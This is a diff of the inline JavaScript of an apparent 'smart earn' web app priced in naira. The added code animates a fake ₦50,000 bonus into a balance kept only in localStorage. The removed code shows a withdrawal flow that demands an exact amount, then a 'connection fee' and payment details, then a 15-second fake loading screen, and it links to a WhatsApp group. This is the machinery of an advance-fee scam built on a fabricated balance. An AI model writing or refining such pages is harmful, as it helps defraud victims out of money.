-    document.getElementById('okBtn').addEventListener('click', () => {
-      document.getElementById('notification').classList.remove('active');
-      document.getElementById('welcomeHeader').textContent = `Welcome, ${userName}`;
-      showPage('dashboard');
-    });
+  function goHome() { showPage('dashboard'); }
 
-    document.getElementById('logoutBtn').addEventListener('click', () => {
-      userName = '';
-      currentPageHistory = ['login'];
-      showPage('login');
-    });
+  // === BONUS & LOGOUT ===
+  function claimBonus() {
+    if (currentUser.claimedBonus) return;
+    document.getElementById('claimBtn').style.display = 'none';
+    document.getElementById('bonusResult').classList.remove('hide');
+    document.getElementById('boomMsg').style.display = 'none';
+    document.getElementById('bonusSound').play();
 
-    document.getElementById('helpBtn').addEventListener('click', () => {
-      showPage('helpPage');
-    });
-
-    document.getElementById('groupBtn').addEventListener('click', () => {
-      window.open ('https://chat.whatsapp.com/DLVqED6zS4i0rpfyZNWPCc', '_blank');
-    });
-
-    document.getElementById('airtimeBtn').addEventListener('click', () => showPage('featureLock'));
-    document.getElementById('dataBtn').addEventListener('click', () => showPage('featureLock'));
-
-    document.getElementById('withdrawBtn').addEventListener('click', () => showPage('withdrawal'));
-
-    document.getElementById('withdrawForm').addEventListener('submit', e => {
-      e.preventDefault();
-      const amt = parseInt(document.getElementById('amount').value);
-      if (amt !== 150000) {
-        alert('Amount must be exactly ₦150,000.');
-        return;
+    let count = 0;
+    const target = 50000;
+    const increment = target / 60;
+    const balanceEl = document.getElementById('balanceAmount');
+    const interval = setInterval(() => {
+      count += increment;
+      if (count >= target) {
+        count = target; clearInterval(interval);
+        currentUser.balance = target; currentUser.claimedBonus = true;
+        saveCurrentUser(); updateBalance();
+        document.getElementById('boomMsg').style.display = 'block';
+        document.getElementById('boomSound').play();
+      } else {
+        balanceEl.innerText = `₦${Math.round(count).toLocaleString()}.00`;
       }
-      showPage('connect');
-    });
+    }, 30);
+  }
 
-    document.getElementById('connectBtn').addEventListener('click', () => {
-      showPage('connectionFeeInput');
-    });
+  function closeBonus() {
+    document.getElementById('bonusResult').classList.add('hide');
+    showPage('dashboard');
+  }
 
-    document.getElementById('connectionForm').addEventListener('submit', e => {
-      e.preventDefault();
-      showPage('paymentDetails');
-    });
+  function logout() {
+    currentUser = { name:"", email:"", balance:0, claimedBonus:false };
+    document.getElementById('userName').value = '';
+    document.getElementById('userEmail').value = '';
+    showPage('loginPage');
+  }
 
-    document.getElementById('payBtn').addEventListener('click', () => {
-      showPage('loading');
-      setTimeout(() => {
-        showPage('finalMsg');
-      }, 15000);
-    });
+  function updateBalance() {
+    document.getElementById('balanceAmount').innerText = `₦${currentUser.balance.toLocaleString(undefined, {minimumFractionDigits: 2, maximumFractionDigits: 2})}`;
+  }
 
-    document.getElementById('darkToggle').addEventListener('click', toggleDarkMode);
-  </script>
+  function saveCurrentUser() {
+    const i = allUsers.findIndex(u => u.email === currentUser.email);
+    if (i > -1) allUsers[i] = currentUser;
+    localStorage.setItem('smartEarnUsers', JSON.stringify(allUsers));
+  }
+
+  function showPage(id) {
+    document.querySelectorAll('.container > div').forEach(d => d.classList.add('hide'));
+    document.getElementById(id).classList.remove('hide');
+    window.scrollTo(0, 0);
+  }
+
+  showPage('loginPage');
+</script>
 </body>
 </html>
